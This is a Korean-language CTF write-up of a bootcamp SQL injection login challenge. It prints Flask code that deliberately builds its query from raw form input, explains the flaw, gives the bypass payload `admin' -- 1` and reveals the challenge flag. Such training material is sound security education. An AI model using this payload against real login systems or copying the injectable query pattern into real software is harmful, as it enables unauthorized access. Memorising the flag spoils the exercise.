---
title: "[Writeup] Knockon Bootcamp - 1.1 SQL Injection - Login(100)"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - SQL Injection
  - Login
last_modified_at: 2024-08-24T02:54:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10002/>

![1.1 SQL Injection - Login]()

|

|

|

## 문제 코드

```python
from flask import Flask, request, render_template, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import text
import os

app = Flask(__name__)

MYSQL_DATABASE = os.getenv("MYSQL_DATABASE")
MYSQL_USER = os.getenv("MYSQL_USER")
MYSQL_PASSWORD = os.getenv("MYSQL_PASSWORD")
ADMIN_FLAG = os.getenv("ADMIN_FLAG")
LOGIN_FLAG = os.getenv("LOGIN_FLAG")
MYSQL_HOST = "db"

app.config["SQLALCHEMY_DATABASE_URI"] = (
    f"mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}"
)
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    query = None
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        query = text(
            f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'"
        )
        with db.engine.connect() as connection:
            result = connection.execute(query)
            user = result.fetchone()
        if user and user[1] == "admin":
            return redirect(url_for("success", username=user[1], flag=LOGIN_FLAG))
        elif user:
            return redirect(url_for("success", username=user[1]))
        else:
            error = "Invalid Credentials"
    return render_template("login.html", error=error, query=query)

@app.route("/success")
def success():
    username = request.args.get("username", "Unknown")
    flag = request.args.get("flag", "So.. what?")
    return render_template("success.html", username=username, flag=flag)

if __name__ == "__main__":
    db.create_all()
    app.run(debug=True, host="0.0.0.0", port=8080)

```

|

|

|

## 코드 분석

### 메인 화면

![1.1 SQL Injection - Login]()

```python
SELECT * FROM user WHERE username = 'Usename 폼 입력값' AND password = 'Password 폼 입력값'
```

값을 입력하면 위 형태로 쿼리가 실행되는 걸 확인할 수 있음

|

![1.1 SQL Injection - Login]()

폼에 `‘` 를 입력하면 에러가 뜸

사용자 입력을 제대로 처리하지 않고 쿼리를 직접 전달하는 것임

쿼리를 조작하는 것이 가능하다는 것으로 SQL Injection이 가능함을 알 수 있음

|

|

|

## 코드 분석

### login()

---

```python
if request.method == "POST":
```

POST 방식으로 로그인 폼을 제출해야만 코드가 실행됨.

|

```python
username = request.form["username"]
password = request.form["password"]
```

**`flask의 request.form`**: 제출된 폼 데이터를 딕셔너리처럼 접근 가능

제출된 폼 데이터에서 “username”과 "password” 필드의 값을 request.form에서 가져와 각 변수에 저장

|

```python
query = text(
	f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'"
)
```

폼 입력 값이 저장된 변수 `username`과 `password`로 쿼리를 동적으로 생성 → 공격 대상

|

```python
with db.engine.connect() as connection:
```

데이터베이스 연결 설정

블록 내부에서만 데이터베이스 연결을 유지하고 블록을 벗어나면 자동으로 연결 종료

|

```python
result = connection.execute(query)
```

위에서 생성한 `query`변수에 담긴 SQL 쿼리 실행

|

```python
user = result.fetchone()
```

`result`(쿼리 결과)에서 첫 번째 행을 가져와 `user` 변수에 저장

|

```python
if user and user[1] == "admin":
return redirect(url_for("success", username=user[1], flag=LOGIN_FLAG)
```

`user`가 존재하고 `user[1]`(user의 두 번째 필드)이 “admin”이면,

“success” 뷰로 리다이렉트 후 flag 변수를 LOGIN_FLAG로 설정

```python
elif user:
	return redirect(url_for("success", username=user[1]))
```

`user`가 존재하지만 `user[1]`이 없는 경우

“success” 뷰로만 리다이렉트

|

### success()

---

```python
username = request.args.get("username", "Unknown")
flag = request.args.get("flag", "So.. what?")
return render_template("success.html", username=username, flag=flag)
```

**`username`**: username 파라미터가 제공되었다면 해당 값으로 반환, 제공되지 않았다면 “Unknown” 반환

**`flag`**: flag 파라미터가 제공되었다면 해당 값으로 반환, 제공되지 않았다면 “So.. what?” 반환

`success.html` 이 렌더링되면서 `username`과 `flag` 변수 전달

즉, login()에서 admin으로 로그인에 성공하면 flag가 화면에 나타나게 됨

|

|

|

## 문제 풀이

```sql
SELECT * FROM user WHERE username = '{username}' AND password = '{password}'
```

|

```sql
SELECT * FROM user WHERE username = 'admin' AND password = '{password}'
```

username이 admin이 되어야함

|

```sql
SELECT * FROM user WHERE username = 'admin' -- AND password = '{password}'
```

username = admin인 것이 필요하므로 필요 없는 password는 주석 처리

주의해야 할 점이, 주석 처리를 하기 위해서는 주석 뒤에 최소 한 개의 공백이 존재해야함

```sql
admin' -- 1
```

실제 공격 코드는 이러한 형태가 됨

뒤에 1을 쓰는 이유는 공백이 있음을 명확하게 하기 위해서임. 아닐 수도 있음ㅋ

password는 어차피 주석처리 되기 때문에 아무거나 넣어도 됨 

|

|

|

## Exploit

```python
username: "admin' -- 1"

password: "1"
```

### FLAG

```
K0{y3s_1'm_4dm1n!!}
```

|

---
